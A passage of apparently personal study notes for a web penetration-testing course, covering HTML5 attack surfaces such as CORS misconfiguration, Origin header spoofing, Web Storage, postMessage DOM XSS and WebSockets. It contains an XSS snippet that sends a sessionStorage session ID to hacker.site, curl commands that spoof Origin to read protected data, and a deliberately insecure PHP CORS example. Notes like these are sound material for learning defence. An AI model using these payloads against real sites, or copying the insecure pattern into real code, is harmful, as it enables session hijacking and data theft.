+</code></pre><p id="ad552f5c-aa48-4cd9-887c-4618e757fd4c" class="">Web storage solutions do not implement security mechanisms to mitigate the risk of malicious access to the stored information (see HttpOnly)</p><h3 id="69ce8ff4-f45d-417a-b1a4-baef6a406100" class=""><strong>Offline Web Application – Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#offline-web-application--attack-scenarios"></a></strong></h3><ul id="20401f35-748c-4356-9b39-17f902456826" class="bulleted-list"><li style="list-style-type:disc">With Offline Web apps, the most critical security issue is <strong>Cache Poisoning</strong>.</li></ul><ul id="0201ebd1-481a-4d76-a63f-0cb60100c5cb" class="bulleted-list"><li style="list-style-type:disc">The offile apps can also cache SSL-resources and the root directory of a website.</li></ul><h3 id="505a9eb4-a257-4f97-ad28-cdc0414e905d" class=""><strong>Device Access</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#device-access"></a></strong></h3><p id="c54b38b0-ae33-45d2-977e-a7a2e95d53da" class="">A feature introduced by the HTML5 specs is <strong>Geolocation API</strong></p><p id="6fe8eb53-fe7e-4c83-9883-03d0413473eb" class="">→ http://www.w3.org/TR/geolocation-API/</p><blockquote id="70f09485-9140-435a-b79a-308bfbab156b" class="">This is a way to provide scripted access to identify a users positions based on GPS coordinates (lat and long)</blockquote><h3 id="82cf5fab-64a2-460d-8689-0e5d3bf52f4a" class=""><strong>Geolocation – Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#geolocation--attack-scenarios"></a></strong></h3><p id="7fc79602-2355-4792-b152-603146cb0188" class="">This API access can not only be used For <strong>user tracking</strong>, physical and cross-domain, but also For <strong>breaking anonymity</strong>.</p><h2 id="9bec5950-e3ac-4101-ac32-1f1c42a2304e" class=""><strong>Fullscreen Mode – Attack Scenario</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#fullscreen-mode--attack-scenario"></a></strong></h2><p id="5f83a265-758e-4d9a-b50a-0c5d14b9bee8" class="">Another API that allows a single element (images, videos, etc) to be viewed in full-screnn mode.</p><p id="2f922f32-90a3-4f8a-b6ba-cd4d7fcc608d" class="">→ https://dvcs.w3.org/hg/fullscreen/raw-file/tip/Overview.html</p><ul id="e010da11-70ce-4d3b-a053-df2f4224729c" class="bulleted-list"><li style="list-style-type:disc">This API can be used For <strong>Phishing Attacks</strong>.</li></ul><ul id="52248d87-b1be-4baa-a1bd-ace0e215b774" class="bulleted-list"><li style="list-style-type:disc">Example, sending a phishing page in full screen mode and loading a fake victim website in the background with a image that simulates the browser header, adress bar, etc.</li></ul><h2 id="570818b6-2ee6-4ab1-9962-f1a3276fb45f" class=""><strong>Performance, Integration &amp; Connectivity</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#performance-integration--connectivity"></a></strong></h2><p id="762bf3c0-70b2-4a85-a0de-555e201bfc1c" class="">Many new features such as:</p><ul id="714541e9-cfdd-4272-bbc7-4f038317683f" class="bulleted-list"><li style="list-style-type:disc"><strong>Drag and Drop, HML editing and Workers</strong>( Web and Shared) Improvements are also made on communications, with features such as:</li></ul><ul id="8cd2e075-f895-4b21-a349-863904e29ac4" class="bulleted-list"><li style="list-style-type:disc"><strong>WebSocket</strong> and <strong>XMLHttpRequest2</strong>.</li></ul><h3 id="6dc4acc3-f228-4d3d-9589-6dfe37aa656f" class=""><strong>Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#attack-scenarios"></a></strong></h3><p id="97e94725-9f6b-4995-a0c8-3ebc8de2c151" class=""><strong>Interactive XSS</strong>, with Drag and Drop, to <strong>Remove Shell, port scanning</strong> and <strong>web-based botnets</strong> exploiting the new communication features like <em>WebSocket</em>.</p><ul id="9d37daad-caf1-4b7b-9952-37f3ec7d1e06" class="bulleted-list"><li style="list-style-type:disc">Its also possible to manipulate the <strong>history</strong> stack with methods to add and remove locations, thus allowing <strong>history tampering</strong> attacks.</li></ul><p id="b58d86fa-35d7-40db-a9ff-5eb437fc732f" class="">Sec POV, the most important features introduced are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e46aad41-3c6d-469d-8eef-328d83843f3b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Content Security Policy
+Cross-Origin Resource Sharing
+Cross-Document Messaging
+strengthening of iframe with the Sandboxed attribute.
+
+- http://www.w3.org/TR/CSP/
+- http://www.w3.org/TR/cors/
+- https://html.spec.whatwg.org/multipage/web-messaging.html
+- http://www.w3.org/TR/html5/embedded-content-0.html#attr-iframe-sandbox
+</code></pre><h2 id="14fde4a8-b797-4337-b208-c6371bbd4ad5" class=""><strong>Exploiting HTML5</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#exploiting-html5"></a></strong></h2><p id="300b0759-ab50-4461-842b-d05689a978ef" class="">Which may affect the most widespread technologies introduced by HTML5</p><h3 id="76a5f348-ee2f-47f8-8946-87544fc7d1eb" class=""><strong>CORS Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#cors-attack-scenarios"></a></strong></h3><p id="0e58f187-451c-4228-978d-a565a26041d0" class="">The same origin restrictions began to become more restrictive rather than helpful. In order to relax the SOP, a new specification has been introduced called: Cross-Origin Resource Sharing.</p><p id="06dbf931-415e-4188-b022-84e2cdd8c2bd" class="">→ http://www.w3.org/TR/cors/</p><p id="3ff58fdf-e804-4db8-b7d4-515f2682e2e3" class="">It uses a set of HTTP headers.</p><p id="97c28652-b022-44c5-9fe3-08e107fb23e2" class="">→ http://www.w3.org/TR/cors/#syntax</p><blockquote id="b885c4b1-c958-424a-b2b5-867ee922dbed" class="">These allow both server and browser to communicate in relation to which requests are or not allowed.</blockquote><h3 id="4dda2c06-68e4-4e14-8a5b-a384307c1f4a" class=""><strong>Universal Allow</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#universal-allow"></a></strong></h3><p id="a18c5dc5-d276-428f-9d97-b3a4ee4447a2" class="">The first CORS headers is <strong>Access-Control-Allow-Origin</strong>, which indicates whether a resource can be shared or not.</p><p id="e521eef8-fef1-4a19-9f61-b01f8c40f638" class="">This is based upon it returning the value of the Origin request header, *, or null in the response:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97778247-d3dc-41a2-8a40-7fab4a45aa20" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Access-Control-Allow-Origin = &quot;Access-Control-Allow-Origin&quot; &quot;:&quot; origin-list-or-null | &quot;*&quot;
+</code></pre><h3 id="1f9938ef-f7e6-48ec-9567-b64fc710fb11" class=""><strong>Allow by Wildcar Value *</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#allow-by-wildcar-value-"></a></strong></h3><p id="b3f50463-09f5-466f-b384-d0e18aa028d0" class="">Generally this is not a required behavior, but rather a matter of laziness of the implementer. This is one of the most common misconfigurations with CORS headers.</p><p id="7a91990d-4996-44c9-a3d1-c8db559ee379" class="">How to abuse?</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ee641d7-5d83-494f-8d2b-a8c2a081b526" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- If XSS is found on the page served with &#x27;Access-Control-Allow-Origin *&#x27;, it can be used to infect or impersonate users.
+- Tricking users to access a controlled website and making a COR query to their internal resources in order to read the responses.
+- Use the users as a proxy to exploit vulnerabilities, therefore leveraging the fact that the HTTP Referrer header is often not logged.
+</code></pre><h3 id="c896b4e2-a8d6-4cbb-9a2b-9e7764638c67" class=""><strong>Universal Allow</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#universal-allow-1"></a></strong></h3><p id="3c1ac0a8-50f4-45b3-8349-18daa22d9bdf" class="">In CORS, the <strong>Access-Control-Allow-Credentials</strong> indicates that the request can include user credentials. http://www.w3.org/TR/cors/#user-credentials</p><h3 id="c75a0cc0-353d-4b6c-8d2c-a89f128bcdb0" class=""><strong>Allow by Server-side</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#allow-by-server-side"></a></strong></h3><p id="9b366237-dcdb-4de6-989b-74ae4065a72f" class="">Allowing COR from all domains with credentials included:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="649cee0b-1782-400e-9ecc-685e9d1eea52" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+header(&#x27;Access-Control-Allow-Origin: &#x27;+$_SERVER[&#x27;HTTP_ORIGIN&#x27;]);
+header(&#x27;Access-Control-Allow-Credentials: true&#x27;);
+</code></pre><p id="499bbb19-c328-4934-b3d3-700de4a2e4eb" class="">By design, this implementation allows CSRF.</p><blockquote id="debd6c38-a1c7-412c-8dfb-9bed68c740b1" class="">Any origin will be able to read the anti-CSRF tokens from the page, therefore consenting any domain on the internet to impersonate the web application users.</blockquote><h3 id="ef38c820-f9c5-4073-91d9-320a51f908be" class=""><strong>Weak Access Control</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#weak-access-control"></a></strong></h3><p id="ca35043c-07e1-4971-a120-1dd89ce8b8f7" class="">CORS specifications provide a request header named <strong>Origin</strong>. It indicates where the COR or Preflight Request originates from.</p><ul id="7962b8fc-ae9c-42c4-9ffe-8a0d4ac9737c" class="bulleted-list"><li style="list-style-type:disc">The header can be spoofed by creating requests outside of the browsers. For example, one can use a proxy or using tool like cURL, Wget, etc.</li></ul><h3 id="bbcc5057-095b-441c-965d-f18a74090fe8" class=""><strong>Check Origin Example</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#check-origin-example"></a></strong></h3><p id="4776622a-997e-4dcd-bf8a-e7a91c9509d8" class="">Suppose that a victim.site supports CORS and, not only reveals sensitive information to friendly origins, but also reveals simple information to everyone.</p><p id="da263e7c-531e-4274-a2b8-7d413ac8252e" class="">By using CURL its possible to bypass the access control by setting the Origin header to the allowed value: friend.site.</p><p id="91576e22-78ea-4fbe-b8b2-300f53bac444" class="">In so doing, its possible to read the sensitive information sent:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="11ecd3fb-e7e3-496f-aeac-7da5b172c1a1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl http://victim.site/html5/CORAaccessContro.php
+# normal output
+
+curl --header &#x27;Origin: http://hacker.site&#x27; http://victim.site/...
+# normal output
+
+curl --header &#x27;Origin: http://friend.site&#x27; http://victim.site/...
+# sensitive information found
+</code></pre><h3 id="babad493-9770-4540-af9b-fbca8deb8758" class=""><strong>Intranet Scanning</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#intranet-scanning"></a></strong></h3><p id="0428bfb3-ceae-44e9-b8f6-b7ce38ddbd7b" class="">Its also possible to abuse COR in order to perform time-based intranet scanning.</p><ul id="852a41d6-8fee-465e-995c-bed8bf480f74" class="bulleted-list"><li style="list-style-type:disc">Send XHR to either an arbritrary IP address or domain names and, depending on the response time, establish wheter a host is up or a specific port is open.</li></ul><h3 id="2ff0d4e2-63ce-48c3-91e3-4ef94783dea6" class=""><strong>JS-Recon</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#js-recon"></a></strong></h3><p id="28421c8f-3c49-4549-8201-62d30adeb171" class="">Its a HTML5 based Javascript Network Reconnaissance tool</p><p id="ce2bb3f8-038d-4fc5-90e6-2e41a20ac120" class="">→ https://web.archive.org/web/20120313125925/http:/www.andlabs.org/tools/jsrecon/jsrecon.html</p><p id="e5364b00-b681-44cb-af27-54013ceed29b" class="">Which features like COR and Web Sockets in order to perform both network and port scanning from the browser.</p><blockquote id="267805a6-fbc1-4387-b61f-2a199a9b5c84" class="">Also useful to guessing users private IP addresses.</blockquote><h3 id="ab897302-eeda-49ab-9614-c311bb2e3eb1" class=""><strong>Remote Web Shell</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#remote-web-shell"></a></strong></h3><p id="4c0c5afe-f619-4702-9871-767f4808d200" class="">If an XSS flaw is found in an app that supports CORS, an attacker can hijack the victim session, establishing a communication channel between the victims browser and the attcker.</p><h3 id="fe151f06-ade7-47f7-8940-1c0ba0256a7f" class=""><strong>The Shell of the Future</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#the-shell-of-the-future"></a></strong></h3><p id="e98375ad-75a5-460b-a1cc-135891ef46f8" class="">→ https://web.archive.org/web/20150223205517/http:/www.andlabs.org/tools/sotf/sotf.html</p><p id="cc96edb3-de3c-47d3-b93e-11e70f65cb76" class="">Its a Reverse Web Shell handler, it can be used to hijack sessions where JavaScript can be inject using XSS or through the browsers address bar. It makes use of HTML5 Cross Origin Requests and can bypass anti-session hijacking measures like Http-Only cookies and IP address-Session ID binding…</p><h2 id="8d1e6bbb-8298-46d9-a3fd-ecc3c6dcd5fc" class=""><strong>Storage Attacks Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#storage-attacks-scenarios"></a></strong></h2><p id="e6766f3c-fcef-402f-8263-b86d606c7742" class="">→ https://tools.ietf.org/html/rfc6265#section-6.1</p><h3 id="b41b53b3-4ccb-4ed0-8887-906c2857892a" class=""><strong>Web Storage</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#web-storage"></a></strong></h3><p id="1148c14e-ee2f-4e54-86bc-d49b4668488c" class="">Its the first stable HTML5 specification that rules two well known mechanisms: Session Storage and Local Storage.</p><p id="d0cf0fec-dd2a-42cf-ba27-e2ec5c98b6a6" class="">The implementations are similar to cookies and they are also known as key-value storage and DOM storage. Anything can be converted to a string or serialized and stored:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fba1d5a1-5c06-47ff-8785-3f26576fe1b1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">window.(localStorage|sessionStorage).setItem(&#x27;name&#x27;,&#x27;Joao&#x27;);
+#         DOM properties                       Key     Value
+</code></pre><ul id="1a1c0481-f29c-49db-811f-97ee040d0382" class="bulleted-list"><li style="list-style-type:disc">http://www.w3.org/TR/webstorage/#security-storage</li></ul><blockquote id="8c7e1253-df14-48dd-8dd8-6be0ab3a37a7" class="">The main issue with this technology is that developers are not aware of the security concerns presented in this specification, which clearly reports the security risks this feature may introduce.</blockquote><h3 id="870781b7-0315-4bdd-8faf-3ab74f4b0faa" class=""><strong>Session Hijacking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#session-hijacking-1"></a></strong></h3><p id="7cb6f9df-a248-4661-b74a-b40b5ad268bd" class="">In the case of an XSS attack, Web Storage is a property of the Window object; therefore, its accessible via the DOM and, in a similar fashion to cookies, it can be compromised.</p><p id="4c16b292-3c53-4fcb-bfd2-f677ef75892c" class="">The exploitation is similar to the one used For cookies, but the only difference is in the API used to retrieve the values:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="edd78eaf-57b9-4d93-8b50-acfb77f8f45a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt; new Image.src = &quot;http://hacker.site/C.php?cc=&quot; +escape(sessionStorage.getItem(&#x27;sessionID&#x27;));
+&lt;/script&gt;
+</code></pre><ul id="e0af3ce1-e2e9-4f7b-9361-f89216ade915" class="bulleted-list"><li style="list-style-type:disc">HTTP cookies have attributes, such as <strong>HTTPOnly</strong>, that were introduced to stop the session hijacking phenomena.</li></ul><ul id="ef1ea9ac-bbd6-4fd0-ac88-5dc07de0bc04" class="bulleted-list"><li style="list-style-type:disc">This security measure, however, is completely missing For WebStorage technologies, making it completely inappropriate For storing both session identifiers and sensitive information</li></ul><h3 id="5f7fbefd-645a-44a7-87d6-c4fe59e03f73" class=""><strong>Cross-Directory Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#cross-directory-attacks"></a></strong></h3><p id="49bb3652-2005-4a43-a32a-4eee5de64b14" class="">Another important difference is that, unlike HTTP cookies, there is no feature to restrict the access by pathname, making the Web Storage content available in the whole origin. This may also introduce Cross-Directory attacks.</p><ul id="03400085-ed7b-4b15-8b25-3944e86af3f5" class="bulleted-list"><li style="list-style-type:disc">This is typical For various social networks like facebook, or universities.</li></ul><p id="ef1bb4b6-d314-41bf-b0f1-1101a6e960d1" class="">Example:</p><ul id="f1fa99df-637a-48a7-9869-146328ee10e3" class="bulleted-list"><li style="list-style-type:disc">If a XSS flaw is found in the university path uni.edu/~professorX, its possible to read all stored data in all the directories available in the university domain uni.edu.</li></ul><h3 id="2e279bfe-a14e-4e05-949a-43a42cfeb375" class=""><strong>Using Tracking and Confidential Data Disclosure</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#using-tracking-and-confidential-data-disclosure"></a></strong></h3><p id="ae4995d3-4f22-4b49-b1bc-7d3042996cc4" class="">Its possible to perform User Traking if websites use Web Storage objects to store information about users behaviors rather than HTTP Cookies.</p><h3 id="0c05a2ca-d53f-4707-8949-01259195c42a" class=""><strong>IndexedDB</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#indexeddb"></a></strong></h3><p id="db14ce9d-f7e6-4597-998c-079745a37780" class="">When working with structured data, it does not provide an efficient mechanism to search over values.</p><p id="9d7d193b-481c-436c-8a13-95cc3c4f2db7" class="">To address these limitations, two options that HTML5 introduced:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e9c6dea0-7842-48c4-afe7-b0ff63db4114" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- IndexedDB - http://www.w3.org/TR/IndexedDB/
+- Web SQL Databse - http://www.w3.org/TR/webdatabase/
+// the second was deprectated in 2010
+</code></pre><ul id="73008d18-1d10-4011-a9f5-9507cca50309" class="bulleted-list"><li style="list-style-type:disc">webSQL database is a relational database access system, whereas IndexedDB is an indexed table system.</li></ul><ul id="32a75902-bd79-4d6b-acd0-99ed1ea13d1c" class="bulleted-list"><li style="list-style-type:disc">Indexed Database API is an HTML5 API introduced For high performance searches on client-side storage. The idea is that this storage would hold significantamounts of structured, indexed data, thereby giving developers an efficient client-side querying mechanism.</li></ul><ul id="d42d8dcc-8689-45d1-972b-29f31ceaae95" class="bulleted-list"><li style="list-style-type:disc">Its a transactional technology, however, not relational. The database system saves key-value pairs in object stores and allows searching data by using indexes also known as keys.</li></ul><ul id="0f3ec804-5e29-44ee-bba4-af94453e5c77" class="bulleted-list"><li style="list-style-type:disc">The primary risks are related to <strong>information leakage</strong> and <strong>information spoofing</strong></li></ul><ul id="e643a7b6-2dc5-4a00-8cdc-f81341f45edc" class="bulleted-list"><li style="list-style-type:disc">IndexedDB follows the Same-Origin Policy but limits the use to HTTP and HTTPS in all browser except Internet Explorer.</li></ul><p id="e693328a-516e-4da3-9a6d-ab97fb1d1f76" class="">This also allows <strong>ms-wwa</strong> and <strong>ms-wwa-web</strong> protocols For their apps in the new Windows UI format.</p><h2 id="290bdd5e-0760-4a41-9aa7-2434608eb0d6" class=""><strong>Web Messaging Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#web-messaging-attack-scenarios"></a></strong></h2><p id="a79f75f4-a80b-4306-9502-e4687ad700bf" class="">→ http://www.w3.org/TR/webmessaging/</p><p id="3b9089d0-6678-4624-af9d-b0062784b68b" class="">This is also referred as Cross Document Messaging or postMessage (API name)</p><p id="9145723b-fb98-4fd4-b120-62f09b94a29b" class="">Communications between the embedded <strong>iframes</strong> and the hosting website are now possible.</p><h3 id="b691b952-56fe-4998-ad47-70e0cb05a84b" class=""><strong>DOM XSS</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#dom-xss"></a></strong></h3><p id="bbe14814-2fe1-4937-a5d1-23d219c890c3" class="">This occurs if the postMessage data received is used without validation. Such as <strong>innerHTML, write, etc</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9f5d73b2-ce12-4cba-80e7-f9e4d047f464" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">...
+// Say Hello
+var hello = document.getElementById(&quot;hellobox&quot;);
+hello.innerHTML = &quot;Hello &quot;+e.data;
+// HTMLElement Sink           User controlled values
+</code></pre><h3 id="c0c18fde-ac43-4349-9f75-be635c613be0" class=""><strong>Origin Issue</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#origin-issue"></a></strong></h3><p id="d089326e-11a4-4cf4-a8ce-0fb1aac52e2d" class="">The Web Messaging Protocl allows the presence of the Origin header field</p><p id="d790e1ca-53dc-4343-96ca-506cbbc5b8e4" class="">The Origin header is not mandatory, but it can help reduce the attack surface by both limiting the interaction with trusted origins and reducing the likelihood of a <strong>Client-side DoS</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9cd1a531-3953-4115-8077-93d9f3c8fd5c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">if (e.origin != &#x27;http://trusted.site&#x27;){
+// Origin not allowed
+return;
+}
+</code></pre><p id="e53282b3-714b-41df-96ad-0bc28e70c207" class="">As we have seen with CORS, even if it cannot be done via browser, the origin header can be spoofed by creating requests outside the browser.</p><h2 id="e87ba06d-602b-4ea2-a173-1076026ade52" class=""><strong>Web Sockets Attack Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#web-sockets-attack-scenarios"></a></strong></h2><p id="b38ebea5-f095-4280-a33d-6a88829a1af1" class="">→ http://tools.ietf.org/html/rfc6455</p><p id="8019a490-1c4b-415f-91ea-2368484bfa91" class="">→ http://www.w3.org/TR/websockets/</p><p id="6df444ca-5b77-4e4f-9005-74a7fe10ed26" class="">HTML5 Web Sockets can provide a 500:1 or –depending on the size of the HTTP headers - even a 1000:1 reduction in unnecessary HTTP header traffic and 3:1 reduction in latency.</p><p id="07996e1c-5d5d-4f65-8058-2b2a07b8e14e" class="">That is not just an incremental improvement; that is a revolutionary jump.</p><blockquote id="806f81ca-0801-4032-b4bf-ea2581fc9491" class="">If we are able to execute JavaScript code inside the victim browser, its possible to establish a Web Socket connection and perform our malicious operations.</blockquote><h3 id="c3afc0a3-c87c-4caa-9357-443229b571af" class=""><strong>Data validation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#data-validation"></a></strong></h3><p id="b96c6e1e-938a-49a8-a7d8-77d86eb68b86" class="">One of the simplest data validation issues to find may be XSS and while looking For it, we might also find other types of Injections concerning both client-side and server-side.</p><h3 id="7724e8c4-155f-45a1-aa02-a0d0f6a6d469" class=""><strong>MiTM</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#mitm"></a></strong></h3><p id="29ef78e8-b4ca-4754-bce2-561a0ad0c5da" class="">WebSocket Protocol standard defines two schemes For web socket connections:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa915c2e-beaf-4b13-a52f-4e48da1e4014" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">xs  = unencrypted
+xss = encrypted
